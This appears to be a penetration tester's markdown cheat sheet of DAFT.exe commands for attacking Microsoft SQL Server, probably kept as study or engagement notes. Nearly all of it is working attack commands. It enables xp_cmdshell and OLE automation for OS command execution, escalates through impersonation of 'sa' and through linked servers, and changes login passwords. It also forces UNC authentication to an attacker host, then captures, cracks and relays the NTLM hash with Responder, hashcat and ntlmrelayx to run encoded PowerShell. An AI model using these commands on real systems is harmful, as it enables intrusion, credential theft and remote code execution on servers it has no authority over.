# DAFT Commands

### Generic Info

```
daft.exe -i <SQL SERVER> -d master -m query -q "select system_user;"
daft.exe -i <SQL SERVER> -d master -m query -q "SELECT LEFT(@@version, CHARINDEX(' - ', @@version)) ProductName;"
daft.exe -i <SQL SERVER> -d master -m query -q "SELECT IS_SRVROLEMEMBER('sysadmin');"
daft.exe -i <SQL SERVER> -d master -m query -q "SELECT IS_SRVROLEMEMBER('sysadmin');"
```

### List Databases and Owners

```
DAFT.exe -i <SQL SERVER> -d master -m Database | findstr "DatabaseName && DatabaseOwner"
```

### Checks for some Excessive Privileges, only found Database Ownership Chaining

```
DAFT.exe -i <SQL SERVER> -d master -m AuditPrivDbChaining
```

### Basic server information

```
DAFT.exe -i <SQL SERVER> -d master -m ServerInfo
```

### Lists links

```
DAFT.exe -i <SQL SERVER> -d master -m ServerLink
```

### Link crawling

```
DAFT.exe -i <SQL SERVER> -d master -m ServerLinkCrawl
```

Lists granted permissions

```
DAFT.exe -i <SQL SERVER> -d master -m ServerPriv
```

### Lists sysadmins

```
DAFT.exe -i <SQL SERVER> -d master -m ServerRoleMember
```

### Using specific DB Creds

```
daft.exe -i <SQL SERVER> -d master -e USER:PASSWORD -m query -q "EXEC ('xp_cmdshell ''whoami'';') AT <SQL SERVER>;"
```

### Impersonation

```
daft.exe -i <SQL SERVER> -d msdb -m query -q "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';"
```

### Found this uncertain of output exactly

```
daft.exe -i <SQL SERVER> -d music -m query -q "SELECT grantee_principal.name AS WhoCanImpersonate ,grantee_principal.type_desc AS ImpersonatorType ,sp.name AS WhoCanTheyImpersonate ,sp.type_desc AS ImpersonateeLoginType FROM sys.server_permissions AS prmssn INNER JOIN sys.server_principals AS sp ON sp.principal_id = prmssn.major_id AND prmssn.class = 101 INNER JOIN sys.server_principals AS grantee_principal ON grantee_principal.principal_id = prmssn.grantee_principal_id WHERE prmssn.state = 'G'"
```

### Change a users password

```
daft.exe -i <SQL SERVER> -d master -m query -q "ALTER LOGIN sqlUsername WITH PASSWORD = N'qwer1234QWER!@#$';"
```

### OLE Stored Procedure

```
daft.exe -i <SQL SERVER> -d master -e 'USERNAME:PASSWORD' -m query -q "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null,'ping 192.168.49.59'"
```

### XP cmd shell

```
daft.exe -i <SQL SERVER> -d master -e USERNAME:PASSWORD -m query -q "EXEC sp_configure 'show advanced options', 1; reconfigure;'"

daft.exe -i <SQL SERVER> -d master -e USERNAME:PASSWORD -m query -q "EXEC sp_configure 'xp_cmdshell', 1; reconfigure;'"

daft.exe -i <SQL SERVER> -d master -e USERNAME:PASSWORD -m query -q "EXEC xp_cmdshell 'whoami';"
```

### COMMAND EXECUTION - LOCAL - XP COMMAND SHELL

```
daft.exe -i <SQL SERVER> -d master -m query -q "EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell ipconfig;"
```

### UNC Injection

```
daft.exe -i <SQL SERVER> -d master -m query -q "EXEC master..xp_dirtree \"\\192.168.X.Y\test\";"
```

#### Capture NTLM Relay hash

Set up responder ad get NTML relay hash

```
responder -I tun0
```

crack it with hashcat

```
 hashcat -m 5600 sqlsvc_hash.txt /usr/share/wordlists/rockyou.txt --force
```

#### Relay hash for code execution

impacket ntlmrelay

```
python3 ntlmrelayx.py --no-http-server -smb2support -t 172.16.98.152 -c 'powershell -enc <ENDOCDED COMMAND>'
```

### DAFT Built in CMD Execution

```
daft.exe -i "<SQL SERVER>" -m OSCmd -q whoami
```

### Linked PrivEsc

```
daft.exe -i <SQL SERVER> -d master -m query -q "EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT <LINKED SQL SERVER>') AT <FIRST SQL SERVER>"

daft.exe -i <SQL SERVER> -d master -m query -q "EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT <LINKED SQL SERVER>') AT <FIRST SQL SERVER>"

daft.exe -i <SQL SERVER> -d master -m query -q "EXEC ('EXEC (''xp_cmdshell ''''whoami'''';'') AT <LINKED SQL SERVER>') AT <FIRST SQL SERVER>"
```

### Linked Servers XP cmd shell

```
daft.exe -i <SQL SERVER> -d master -m query -q "EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT <SQL SERVER>;"

daft.exe -i <SQL SERVER> -d master -m query -q "EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT <SQL SERVER>;"

daft.exe -i <SQL SERVER> -d master -m query -q "EXEC ('xp_cmdshell ''" + command + "'';') AT <SQL SERVER>;"
```

### Linked Servers xp cmd shell - openquery

```
daft.exe -i <SQL SERVER> -d master -m query -q "SELECT 1 FROM openquery(<SQL SERVER>,'SELECT 1;EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;')"

daft.exe -i <SQL SERVER> -d master -m query -q "SELECT 1 FROM openquery(<SQL SERVER>,'SELECT 1;EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;')"

daft.exe -i <SQL SERVER> -d master -m query -q "SELECT 1 FROM openquery(<SQL SERVER>,'SELECT 1;EXEC master..xp_cmdshell ''whoami'';')"

**
daft.exe -i <SQL SERVER> -d master -m query -q "SELECT * FROM OPENQUERY([<SQL SERVER>],'Select @@Servername SYSTEM_USER')"
```

### Add Linkded Login

```
daft.exe -i <SQL SERVER> -d master -m query -q "EXEC master.dbo.sp_addlinkedserver @server = N'<SQL SERVER>', @provider=N'SQLNCLI', @datasrc=N'<SQL SERVER>';" 

daft.exe -i <SQL SERVER> -d master -m query -q "EXEC master.dbo.sp_addlinkedsrvlogin @rmtsrvname = 
N'<SQL SERVER>', @locallogin = NULL , @useself = N'True', @rmtuser=N'asdf',@rmtpassword=N'asdfasdfasdf';;"
```

### ALTER Role cmd

```
daft.exe -i <SQL SERVER> -d master -m query -q "EXEC ('ALTER ROLE db_owner ADD MEMBER aids;') AT <SQL SERVER>;"
```

### Enable RPC

```
daft.exe -i <SQL SERVER> -d master -m query -q "EXECUTE AS LOGIN = 'sa'; EXEC sp_serveroption '<SQLSERVER>', 'rpc out', 'true';EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT <SQLSERVER>;"
```
